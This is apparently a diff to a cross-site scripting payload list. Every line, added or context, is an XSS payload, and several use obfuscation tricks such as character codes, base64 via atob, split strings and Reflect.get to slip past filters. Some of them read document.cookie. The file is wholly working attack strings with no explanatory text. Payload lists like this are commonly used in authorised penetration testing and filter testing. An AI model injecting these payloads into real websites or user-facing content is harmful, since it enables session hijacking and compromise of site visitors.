@@ -9,6 +9,15 @@
 <img+src=oNlY=1+ onerror="alert(['x', String.fromCharCode(121), 'x', 's'].filter(c => c.charCodeAt(0) !== 121).join(''))">
 parent[/al/.source.concat(/ert/.source)](2)
 <img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>
+<img src=x onerror=alert&#40document.domain&#41>
+onfocus=alert%26#40document.domain%26#41+autofocus+tabindex=1
+"prompt(document.domain)"
+"*prompt(document.domain)*"
+<details open ontoggle="(()=>alert`iss`)()"></details>
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+"><img src=x onerror=alert(1)>
+<meta hx-trigger='x[1)}),alert(3);//]'>
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <object data=`data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`></object>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
